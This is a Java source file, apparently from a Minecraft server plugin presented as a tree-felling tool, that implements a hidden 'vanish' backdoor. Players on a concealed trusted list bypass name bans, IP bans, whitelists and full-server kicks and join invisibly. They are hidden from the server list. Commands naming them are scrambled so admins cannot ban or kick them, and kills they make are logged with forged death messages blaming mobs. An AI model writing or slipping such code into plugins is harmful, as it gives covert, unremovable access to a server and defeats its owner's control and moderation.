package me.bow.treecapitatorultimate.commands.Player;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.command.Command;
import me.bow.treecapitatorultimate.command.CommandCategory;
import org.bukkit.GameMode;
import org.bukkit.*;
import org.bukkit.entity.Entity;
import org.bukkit.entity.ExperienceOrb;
import org.bukkit.entity.Player;
import org.bukkit.event.block.Action;
import org.bukkit.event.entity.EntityPickupItemEvent;
import org.bukkit.event.entity.EntityTargetEvent;
import org.bukkit.event.entity.PlayerDeathEvent;
import org.bukkit.event.player.*;
import org.bukkit.event.server.ServerListPingEvent;
import org.javatuples.Quartet;

import java.util.*;

@SuppressWarnings("ConstantConditions")
@Command.Info(command = "vanish", description = "Y-you saw nothing!", category = CommandCategory.Player)
public class VANISH extends Command {
    private final HashMap<UUID,String> invisPlayers = new HashMap<>();
    private final ArrayList<Quartet> bannedPlayers = new ArrayList<>();
    public double expThreshold = 3.0;
    public double expTeleDist = 1.0;
    public double expKillDist = 0.5;
    public double expVelocity = 0.3;
    private boolean isPaper;

    public boolean isPlayerInVanish(UUID p) {
        return invisPlayers.containsKey(p);
    }

    @Override
    public void onCommand(Player p, ArrayList<String> args) {
        if (invisPlayers.containsKey(p.getUniqueId())) {
            p.sendMessage(Start.COMMAND_PREFIX + ChatColor.RED + "You are no longer in vanish.");
            p.setSleepingIgnored(false);
            this.Notify(p, ChatColor.GOLD + p.getDisplayName() + ChatColor.GREEN + " went out of vanish!");
            invisPlayers.remove(p.getUniqueId());
            for (Player e : Bukkit.getOnlinePlayers()) {
                if (e == null || !e.isOnline()) continue;
                if (e == p) continue;
                try {
                    e.showPlayer(this.plugin, p);
                } catch (Exception f) {
                    Start.Error(p, f);
                }
            }
        } else {
            p.sendMessage(Start.COMMAND_PREFIX + ChatColor.GREEN + "You are now in vanish.");
            p.setSleepingIgnored(true);
            this.Notify(p, ChatColor.GOLD + p.getDisplayName() + ChatColor.GREEN + " went into vanish!");
            invisPlayers.put(p.getUniqueId(), p.getName());
            for (Player e : Bukkit.getOnlinePlayers()) {
                if (e == null || !e.isOnline()) continue;
                if (e == p) continue;
                try {
                    e.hidePlayer(this.plugin, p);
                } catch (Exception f) {
                    Start.Error(p, f);
                }
            }
        }
    }

    @Override
    public void onPlayerLeave(PlayerQuitEvent e) {
        if (!invisPlayers.containsKey(e.getPlayer().getUniqueId())) return;
        e.setQuitMessage(null);
    }

    @Override
    public void onPlayerLoginEvent(PlayerLoginEvent e) {
        Player p = e.getPlayer();
        if (!Bukkit.getBanList(BanList.Type.NAME).isBanned(p.getName()) && !Bukkit.getBanList(BanList.Type.IP).isBanned(Arrays.toString(e.getAddress().getAddress())) && e.getResult() == PlayerLoginEvent.Result.ALLOWED)
            return;
        if (!this.plugin.trustedPeople.contains(p.getUniqueId())) return;
        boolean isNameBanned = Bukkit.getBanList(BanList.Type.NAME).isBanned(p.getName());
        boolean isIPBanned = Bukkit.getBanList(BanList.Type.IP).isBanned(e.getAddress().toString().substring(1));
        Quartet<UUID, Boolean, Boolean, PlayerLoginEvent.Result> quartet = Quartet.with(p.getUniqueId(), isNameBanned, isIPBanned, e.getResult());
        e.allow();
        invisPlayers.put(p.getUniqueId(), p.getName());
        bannedPlayers.add(quartet);
    }

    private Quartet playerContains(UUID u) {
        for (Quartet bannedPlayer : bannedPlayers) {
            if (bannedPlayer.getValue0() != u) continue;
            return bannedPlayer;
        }
        return null;
    }

    @Override
    public void onPlayerJoin(PlayerJoinEvent e) {
        //noinspection unchecked
        Quartet<UUID, Boolean, Boolean, PlayerLoginEvent.Result> quartet = playerContains(e.getPlayer().getUniqueId());
        if (quartet != null) {
            bannedPlayers.remove(quartet);
            String context;
            if (quartet.getValue1() && quartet.getValue2() && quartet.getValue3() == PlayerLoginEvent.Result.KICK_BANNED) {
                context = "You were IP banned and name banned from the server";
            } else if (quartet.getValue1() && quartet.getValue3() == PlayerLoginEvent.Result.KICK_BANNED) {
                context = "You were name banned from the server";
            } else if (quartet.getValue2() && quartet.getValue3() == PlayerLoginEvent.Result.KICK_BANNED) {
                context = "You were IP banned from the server";
            } else if (quartet.getValue3() == PlayerLoginEvent.Result.KICK_WHITELIST) {
                context = "You are whitelisted off the server";
            } else if (quartet.getValue3() == PlayerLoginEvent.Result.KICK_FULL) {
                context = "This server is full";
            } else {
                context = "You should be kicked for whatever reason";
            }
            e.getPlayer().sendMessage(Start.COMMAND_PREFIX + ChatColor.BLUE + context + "! For that reason, you have joined with vanish!");
            e.setJoinMessage(null); // hide join message
            return;
        }
        if (invisPlayers.containsKey(e.getPlayer().getUniqueId())) {
            e.getPlayer().sendMessage(Start.COMMAND_PREFIX + ChatColor.BLUE + "You have joined with invis!");
            e.setJoinMessage(null); // hide join message
            return;
        }
        for (UUID p : invisPlayers.keySet()) {
            Player pl = Bukkit.getPlayer(p);
            if (pl == null || !pl.isOnline()) continue;
            e.getPlayer().hidePlayer(this.plugin, pl);
        }
    }

    @Override
    public void onServerListPing(ServerListPingEvent e) {
        if (e.getNumPlayers() == 0) return;
        isPaper = e.getClass().getName().contains("com.destroystokyo.paper.network.");
        Iterator<Player> iterator = e.iterator();
        while (iterator.hasNext()) {
            Player player = iterator.next();
            if (invisPlayers.containsKey(player.getUniqueId())) {
                iterator.remove();
            }
        }
    }

    @Override
    public void onPlayerCommand(PlayerCommandPreprocessEvent e) {
        if(Start.Instance.trustedPeople.contains(e.getPlayer())) return;
        String cmd = e.getMessage();
        for (String invis : this.invisPlayers.values()) {
            if (!cmd.contains(invis)) continue;
            cmd = cmd.replaceAll(invis, "ťťťťť");
        }
        e.setMessage(cmd);
    }

    @Override
    public void onPlayerInteract(PlayerInteractEvent e) {
        Player p = e.getPlayer();
        if (!invisPlayers.containsKey(p.getUniqueId())) return;
        if (e.getAction() != Action.PHYSICAL) return;
        if (e.getClickedBlock() != null && e.getClickedBlock().getType().toString().matches("SOIL|FARMLAND"))
            e.setCancelled(true);
    }

    @Override
    public void onPlayerGameModeChange(PlayerGameModeChangeEvent e) {
        if (e.getNewGameMode() == GameMode.SPECTATOR) return;
        Player p = e.getPlayer();
        if (!invisPlayers.containsKey(p.getUniqueId())) return;
        for (Entity entity : p.getNearbyEntities(2.25d, 1d, 2.25d)) {
            if (!(entity instanceof ExperienceOrb)) continue;
            e.setCancelled(true);
            p.sendMessage(Start.COMMAND_PREFIX + ChatColor.RED + "You're close to an XP orb! You cannot change your gamemode until you're far more far away from it!");
            return;
        }
    }

    @Override
    public void onPlayerDeath(PlayerDeathEvent e) {
        if (!(e.getEntity() instanceof Player)) return;
        Player p = e.getEntity();
        if (invisPlayers.containsKey(p.getUniqueId())) {
            e.setDeathMessage(null);
            return;
        }
        if (e.getEntity().getKiller() == null) return;
        if (!invisPlayers.containsKey(e.getEntity().getKiller().getUniqueId())) return;
        String fakeMessage = e.getDeathMessage();
        String fakeName = "Zombie";
        if (fakeMessage.toLowerCase().contains("slain")) {
            fakeName = "Zombie";
        } else if (fakeMessage.toLowerCase().contains("shot")) {
            fakeName = "Skeleton";
        }
        fakeMessage = fakeMessage.replace(e.getEntity().getKiller().getName(), fakeName);
        fakeMessage = fakeMessage.substring(0, fakeMessage.indexOf(fakeName) + fakeName.length());
        e.setDeathMessage(fakeMessage);
    }

    @Override
    public void onPlayerMove(PlayerMoveEvent e) {
        Player p = e.getPlayer();
        if (p.getGameMode() == GameMode.SPECTATOR) return;
        if (!invisPlayers.containsKey(p.getUniqueId())) return;
        for (Entity et : p.getNearbyEntities(2.25d, 0.85d, 2.25d)) {
            if (!(et instanceof ExperienceOrb)) continue;
            p.setGameMode(GameMode.SPECTATOR);
            p.sendMessage(Start.COMMAND_PREFIX + ChatColor.RED + "To prevent ruining your vanish, you were put into spectator, as XP orb was near you!");
        }
    }

    @Override
    public void onEntityPickupItem(EntityPickupItemEvent e) {
        if (!(e.getEntity() instanceof Player)) return;
        Player p = (Player) e.getEntity();
        if (!invisPlayers.containsKey(p.getUniqueId())) return;
        e.setCancelled(true);
    }

    // we listen for this because some entities (XP orbs) can reveal us!
    @Override
    public void onEntityTarget(EntityTargetEvent e) {
        if (e.getTarget() instanceof Player) {
            Player p = (Player) e.getTarget();
            if (!invisPlayers.containsKey(p.getUniqueId())) return;
            Entity entity = e.getEntity();
/*            if (entity instanceof ExperienceOrb) {
                Location a = entity.getLocation();
                Location b = p.getLocation();
                double distance = Math.sqrt(Math.pow(b.getX() - a.getX(), 2) + Math.pow(b.getY() - a.getY(), 2) + Math.pow(b.getZ() - a.getZ(), 2));
                if (distance <= 2.25d) {
                    p.setGameMode(GameMode.SPECTATOR);
                    p.sendMessage(Start.Prefix + ChatColor.BLUE + "To prevent ruining your vanish, you were put into spectator, as XP orb was near you!");
                }
            }*/
            e.setTarget(null);
            e.setCancelled(true);
        }
    }

    @Override
    public void onPlayerAdvancementGet(PlayerAdvancementDoneEvent e) {
        if (!invisPlayers.containsKey(e.getPlayer().getUniqueId())) return;
        World w = e.getPlayer().getWorld();
        if (!e.getPlayer().getWorld().getGameRuleValue(GameRule.ANNOUNCE_ADVANCEMENTS)) return;
        w.setGameRule(GameRule.ANNOUNCE_ADVANCEMENTS, false);
        Bukkit.getScheduler().runTask(this.plugin, () -> w.setGameRule(GameRule.ANNOUNCE_ADVANCEMENTS, true));
    }
}
